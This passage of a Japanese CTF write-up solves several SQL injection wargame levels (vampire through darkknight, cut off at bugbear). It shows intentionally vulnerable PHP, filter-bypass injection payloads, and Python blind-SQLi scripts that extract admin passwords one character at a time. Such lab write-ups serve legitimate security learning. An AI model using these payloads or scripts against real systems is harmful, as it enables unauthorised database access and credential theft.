</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h3 id="考察-9"><a href="#考察-9" class="header-anchor">#</a> 考察</h3> <p>&quot;admin&quot;をreplaceしている．</p> <h3 id="回答-9"><a href="#回答-9" class="header-anchor">#</a> 回答</h3> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_vampire <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'ADMIN'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="skeleton"><a href="#skeleton" class="header-anchor">#</a> skeleton</h2> <h3 id="問題-10"><a href="#問題-10" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_skeleton where id='guest' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>' and 1=0&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;skeleton&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h3 id="考察-10"><a href="#考察-10" class="header-anchor">#</a> 考察</h3> <p>&quot;and 1=0&quot;という条件式があるのでコメントアウトしてあげる．
idはadminに．</p> <h3 id="回答-10"><a href="#回答-10" class="header-anchor">#</a> 回答</h3> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_skeleton <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'guest'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">or</span> id<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token comment">#' and 1=0</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="golem"><a href="#golem" class="header-anchor">#</a> golem</h2> <h3 id="問題-11"><a href="#問題-11" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/or|and|substr\(|=/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_golem where id='guest' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;h2&gt;Hello <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/h2&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select pw from prob_golem where id='admin' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;golem&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h3 id="考察-11"><a href="#考察-11" class="header-anchor">#</a> 考察</h3> <p>pwを当てる必要がある．</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;golem&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>pwで&quot;=&quot;が使えない．like，in関数で対応する．</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/or|and|substr\(|=/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>文字数を確認する際には，以下のようになる．</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>select id from prob_golem where id<span class="token operator">=</span><span class="token single-quoted-string string">'guest'</span> <span class="token keyword">and</span> pw<span class="token operator">=</span><span class="token single-quoted-string string">''</span> <span class="token operator">||</span> id <span class="token function">in</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">length</span><span class="token punctuation">(</span>pw<span class="token punctuation">)</span> like <span class="token number">8</span><span class="token shell-comment comment">#'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>また，substr関数が使えないため，他の関数（mid, left, right）で対応する．</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/or|and|substr\(|=/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>pwの文字数を数える．</p> <p>以下のスクリプトを書いた．</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url <span class="token operator">=</span> <span class="token string">'https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php'</span>
mycookie <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">''</span>
<span class="token punctuation">}</span>
letters <span class="token operator">=</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters
ans <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> letter <span class="token keyword">in</span> letters<span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">&quot;?pw=' || id in ('admin') &quot;</span> <span class="token operator">+</span> <span class="token string">&quot;%26&quot;</span> <span class="token operator">+</span> <span class="token string">&quot;%26&quot;</span> <span class="token operator">+</span> <span class="token string">&quot; mid(pw, {index}, 1) like \'{char}\' -- #&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index <span class="token operator">=</span> i<span class="token punctuation">,</span> char <span class="token operator">=</span> letter<span class="token punctuation">)</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>mycookie<span class="token punctuation">)</span>        
        <span class="token keyword">if</span> <span class="token string">'Hello admin'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            ans <span class="token operator">+=</span> letter
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h3 id="回答-11"><a href="#回答-11" class="header-anchor">#</a> 回答</h3> <p>得られたパスワードを使う．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_golem <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'guest'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">'88e3137f'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="darkknight"><a href="#darkknight" class="header-anchor">#</a> darkknight</h2> <h3 id="問題-12"><a href="#問題-12" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>no<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\'|substr|ascii|=/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>no<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_darkknight where id='guest' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>' and no=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>no<span class="token punctuation">]</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;h2&gt;Hello <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/h2&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select pw from prob_darkknight where id='admin' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;darkknight&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h3 id="考察-12"><a href="#考察-12" class="header-anchor">#</a> 考察</h3> <p>pw，noにおいて，シングルクォートが使えないのでダブルクォートで対応．
noにおいて”=”が使えない．先ほどのようにlikeなどを用いる．
また，noにおいてascii使えないので，<a href="https://www.w3resource.com/mysql/string-functions/mysql-ord-function.php" target="_blank" rel="noopener noreferrer">ord関数<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>で代用．左端の文字がマルチバイト文字でなければ，ord関数はascii関数と同等．</p> <p>以下のようにパスワードの文字を数えた．ちなみに&amp;は%26．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_darkknight <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'guest'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">and</span> <span class="token keyword">no</span><span class="token operator">=</span><span class="token number">100</span> <span class="token operator">or</span> id <span class="token operator">in</span><span class="token punctuation">(</span><span class="token string">&quot;admin&quot;</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> length<span class="token punctuation">(</span>pw<span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token number">8</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>以下のスクリプトを書いて，パスワードを得る．</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url <span class="token operator">=</span> <span class="token string">'https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php'</span>
mycookie <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">''</span>
<span class="token punctuation">}</span>
letters <span class="token operator">=</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters
ans <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> letter <span class="token keyword">in</span> letters<span class="token punctuation">:</span>
        char <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>letter<span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'?pw=1&amp;no=1 || id in (&quot;admin&quot;) '</span> <span class="token operator">+</span> <span class="token string">&quot;%26&quot;</span> <span class="token operator">+</span> <span class="token string">&quot;%26&quot;</span> <span class="token operator">+</span> <span class="token string">&quot; ord(mid(pw, {index}, 1)) like {char} %23&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index <span class="token operator">=</span> i<span class="token punctuation">,</span> char <span class="token operator">=</span> char<span class="token punctuation">)</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>mycookie<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'Hello admin'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            ans <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h3 id="回答-12"><a href="#回答-12" class="header-anchor">#</a> 回答</h3> <p>得られたパスワードを使う．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_darkknight <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'guest'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">'1c62ba6f'</span> <span class="token operator">and</span> <span class="token keyword">no</span><span class="token operator">=</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="bugbear"><a href="#bugbear" class="header-anchor">#</a> bugbear</h2> <h3 id="問題-13"><a href="#問題-13" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>no<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\'|substr|ascii|=|or|and| |like|0x/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>no<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
